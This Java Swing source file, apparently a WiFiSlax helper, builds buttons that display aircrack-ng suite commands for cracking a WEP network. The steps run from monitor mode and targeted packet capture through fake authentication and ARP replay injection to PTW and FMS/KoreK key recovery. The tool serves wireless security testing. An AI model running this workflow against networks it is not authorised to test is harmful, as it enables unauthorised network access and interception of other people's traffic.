package bydan.linux.ventanas.wifislax;

import java.awt.BorderLayout;
import java.awt.EventQueue;

import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.border.EmptyBorder;

import bydan.linux.base.Constantes;
import net.miginfocom.swing.MigLayout;
import javax.swing.JTabbedPane;
import javax.swing.JLabel;
import javax.swing.JButton;
import javax.swing.JTextField;
import javax.swing.JTextArea;
import javax.swing.JScrollPane;
import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;

public class WepWirelessJFrame extends JFrame {

	private JPanel contentPane;
	private JTextField textFieldWepWireless;
	private JTextArea textAreaWepWireless;

	/**
	 * Launch the application.
	 */
	public static void main(String[] args) {
		EventQueue.invokeLater(new Runnable() {
			public void run() {
				try {
					WepWirelessJFrame frame = new WepWirelessJFrame();
					frame.setVisible(true);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
	}

	/**
	 * Create the frame.
	 */
	public WepWirelessJFrame() {
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 589, 427);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);
		contentPane.setLayout(new MigLayout("", "[grow]", "[grow]"));
		
		JTabbedPane tabbedPane = new JTabbedPane(JTabbedPane.TOP);
		contentPane.add(tabbedPane, "cell 0 0,grow");
		
		JPanel panelWepWireless = new JPanel();
		tabbedPane.addTab("Wep Wireless", null, panelWepWireless, null);
		panelWepWireless.setLayout(new MigLayout("", "[grow][]", "[][][][][][][][][grow]"));
		
		JLabel label = new JLabel("Detener Procesos");
		panelWepWireless.add(label, "cell 0 0");
		
		JButton button = new JButton("check kill");
		button.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String sComando="";
				
				sComando="airmon-ng check kill\r\n";
				
				textFieldWepWireless.setText(sComando);
				
				sComando+="kill 1745\r\n";
				sComando+="kill 4578\r\n";
				sComando+="NetworkService start\r\n";
				
				textAreaWepWireless.setText(sComando);
			}
		});
		panelWepWireless.add(button, "cell 1 0");
		
		JLabel lblLevantardetenerMonitor = new JLabel("Levantar/Detener Monitor");
		panelWepWireless.add(lblLevantardetenerMonitor, "cell 0 1");
		
		JButton btnAirmonng = new JButton("airmon-ng");
		btnAirmonng.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String sComando="";
				
				sComando="airmon-ng start "+Constantes.NOMBRE_WLAN+" 1\r\n";
				
				textFieldWepWireless.setText(sComando);
				
				sComando+="airmon-ng stop "+Constantes.NOMBRE_WLAN_MONITOR+"\r\n";
				
				textAreaWepWireless.setText(sComando);
			}
		});
		panelWepWireless.add(btnAirmonng, "cell 1 1");
		
		JLabel lblMostrarInterfaces = new JLabel("Mostrar Interfaces");
		panelWepWireless.add(lblMostrarInterfaces, "cell 0 2");
		
		JButton btnAirmonng_1 = new JButton("airmon-ng2");
		btnAirmonng_1.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String sComando="";
				
				sComando="airmon-ng\r\n";
				
				textFieldWepWireless.setText(sComando);
				
				sComando="";
				
				textAreaWepWireless.setText(sComando);
			}
		});
		panelWepWireless.add(btnAirmonng_1, "cell 1 2");
		
		JLabel lblEscucharWireless = new JLabel("Escuchar Wireless");
		panelWepWireless.add(lblEscucharWireless, "cell 0 3");
		
		JButton btnAirodumpng = new JButton("airodump-ng");
		btnAirodumpng.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String sComando="";
				
				sComando="airodump-ng -c "+Constantes.CANAL+" --bssid "+Constantes.MAC_AP+" -w output_wep "+Constantes.NOMBRE_WLAN_MONITOR+"\r\n";
				
				textFieldWepWireless.setText(sComando);
				
				sComando="";
				
				textAreaWepWireless.setText(sComando);
			}
		});
		panelWepWireless.add(btnAirodumpng, "cell 1 3");
		
		JLabel lblFalsificarAutentificacion = new JLabel("Falsificar Autentificacion (T2)");
		panelWepWireless.add(lblFalsificarAutentificacion, "cell 0 4");
		
		JButton btnAireplayng = new JButton("aireplay-ng");
		btnAireplayng.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String sComando="";
				
				sComando="aireplay-ng --fakeauth 10 -e "+Constantes.BSSID+" -a "+Constantes.MAC_AP+" --ignore-negative-one "+Constantes.NOMBRE_WLAN_MONITOR+"\r\n";
				
				textFieldWepWireless.setText(sComando);
				
				sComando="";
				
				textAreaWepWireless.setText(sComando);
			}
		});
		panelWepWireless.add(btnAireplayng, "cell 1 4");
		
		JLabel lblEnviarArp = new JLabel("Enviar ARP (T3)");
		panelWepWireless.add(lblEnviarArp, "cell 0 5");
		
		JButton btnAireplayng_1 = new JButton("aireplay-ng2");
		btnAireplayng_1.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				
				String sComando="";
				
				sComando="aireplay-ng -3 -b "+Constantes.MAC_AP+" -h "+Constantes.MAC_CLIENTE+" --ignore-negative-one "+Constantes.NOMBRE_WLAN_MONITOR+"\r\n";
				
				textFieldWepWireless.setText(sComando);
				
				sComando="";
				
				textAreaWepWireless.setText(sComando);
			}
		});
		panelWepWireless.add(btnAireplayng_1, "cell 1 5");
		
		JLabel lblCrackear = new JLabel("Crackear (T4)");
		panelWepWireless.add(lblCrackear, "cell 0 6");
		
		JButton btnAircrackng = new JButton("aircrack-ng");
		btnAircrackng.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String sComando="";
				
				sComando="aircrack-ng  crack_wep_01.cap\r\n";
				
				textFieldWepWireless.setText(sComando);
				
				sComando="";
				
				textAreaWepWireless.setText(sComando);
			}
		});
		panelWepWireless.add(btnAircrackng, "flowx,cell 1 6");
		
		textFieldWepWireless = new JTextField();
		panelWepWireless.add(textFieldWepWireless, "cell 0 7 2 1,growx");
		textFieldWepWireless.setColumns(10);
		
		JScrollPane scrollPane = new JScrollPane();
		panelWepWireless.add(scrollPane, "cell 0 8 2 1,grow");
		
		textAreaWepWireless = new JTextArea();
		scrollPane.setViewportView(textAreaWepWireless);
		
		JButton btnPwt = new JButton("PWT");
		btnPwt.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String sComando="";
				
				sComando="aircrack-ng -z -b "+Constantes.MAC_AP+" output*.cap\r\n";
				
				textFieldWepWireless.setText(sComando);
				
				sComando="";
				
				textAreaWepWireless.setText(sComando);
			}
		});
		panelWepWireless.add(btnPwt, "cell 1 6");
		
		JButton btnFmskorek = new JButton("FMS/Korek");
		btnFmskorek.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String sComando="";
				
				sComando="aircrack-ng -b "+Constantes.MAC_AP+" output*.cap\r\n";
				
				textFieldWepWireless.setText(sComando);
				
				sComando="";
				
				textAreaWepWireless.setText(sComando);
			}
		});
		panelWepWireless.add(btnFmskorek, "cell 1 6");
	}

}
